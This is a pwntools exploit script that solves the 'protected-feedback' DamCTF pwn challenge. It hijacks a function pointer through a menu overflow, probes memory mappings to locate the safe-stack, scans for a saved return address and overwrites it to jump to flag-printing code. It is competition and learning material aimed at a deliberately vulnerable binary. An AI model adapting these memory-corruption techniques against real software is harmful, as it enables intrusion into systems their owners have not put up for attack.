#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template protected-feedback
import sys
from pwn import log, args, remote, process, gdb, context, ELF, cyclic_gen, p64, u64, pause
from pwn import *

HOST, PORT = "chals.damctf.xyz 31781".split()

# Set up pwntools for the correct architecture
exe = context.binary = ELF('protected-feedback')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# brva 0x2e29
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def menu_choice(arg0: int, arg1: int, arg2: int) -> None:
    global io
    io.sendlineafter(b"Quit\n", str(arg0).encode())
    io.sendlineafter(b"\n", str(arg1).encode())
    io.sendlineafter(b"\n", str(arg2).encode())


def overwrite_function(payload: int, arg1: int, arg2: int) -> None:
    global io
    io.sendlineafter(b"Quit\n", b"3 " + cyclic_gen().get(16) + p64(payload))
    io.sendlineafter(b"\n", str(arg1).encode())
    io.sendlineafter(b"\n", str(arg2).encode())


def write(arg1: int, arg2: int) -> None:
    global io, ranges
    menu_choice(0, arg1, arg2)
    io.recvuntil(b"@ ")
    address = int(io.recvline().strip(), 0)
    io.recvuntil(b"IDX #")
    index = int(io.recvline().strip(), 10)
    add_range(ranges, address)
    return index, address


def read(arg1: int, arg2: int) -> bytes:
    global io
    menu_choice(1, arg1, arg2)
    return io.recvline()


def quit(arg1: int, arg2: int, where: int, what: int) -> None:
    global io
    menu_choice(2, arg1, arg2)
    io.sendlineafter(b"write?\n", str(where).encode())
    io.sendlineafter(b"write?\n", str(what).encode())


def map_region(arg1:int, arg2: int) -> int:
    overwrite_function(exe.sym.map_region, arg1, arg2)
    io.recvuntil(b"@ ")
    address = int(io.recvline().strip(), 0)
    return address


def print_rating(arg1: int, arg2: int = 0) -> int:
    overwrite_function(exe.sym.print_rating, arg1, arg2)
    io.recvuntil(b": ")
    val0, val1 = io.recvline().strip().split(b"/")
    return int(val0), int(val1)


def add_range(ranges: list, address: int) -> None:
    if not ranges:
        ranges.append((address, address+0x1000))
        return

    for index, r in enumerate(ranges):
        beg, end = r
        if address < beg and beg - address == 0x1000:
            ranges[index] = (address, end)
            return
        if address == end:
            ranges[index] = (beg, address + 0x1000)
            return
    else:
        ranges.append((address, address+0x1000))

io = start()

ranges = []

end = 0x800000000000
start = 0x7ff000000000
map_size = 0x100000000

# find safe-stack
for _ in range(16):
    address = map_region(start, map_size)
    if address < start:
        log.info(f"{hex(start)} is probably near the safe-stack")
        break
    log.info(f"address mapped @ {hex(address)}")
    start = address + map_size

while map_size > 0x1000:
    address = map_region(start, map_size)
    if address < start:
        map_size = map_size // 2
        continue
    log.info(f"address mapped @ {hex(address)}")
    start = address + map_size

log.info(f"start: {hex(start)}, map_size: {hex(map_size)}")
safe_stack = start + 0x100000
log.info(f"safe-stack is probably @ {hex(safe_stack)}")

return_address = safe_stack + 0x21000
egg = 0x402f44

# search for return address
for offset in range(0x10, 0x4000, 0x10):
    temp = return_address - offset
    value0, value1 = print_rating(temp)
    if value0 == egg:
        log.info(f"values: {hex(value0)}, {hex(value1)} @ {hex(temp)}")
        log.success(f"Got return address @ {hex(temp)}")
        return_address = temp
        break
    if value1 == egg:
        log.info(f"values: {hex(value0)}, {hex(value1)} @ {hex(temp)}")
        log.success(f"Got return address @ {hex(temp + 8)}")
        return_address = temp + 8
        break
else:
    log.critical("Failed to find egg")
    exit()

flag = 0x2ede
quit(0, 0, return_address, flag)
flag = io.recvline().strip().decode()
log.success(f"Got flag: {flag}")

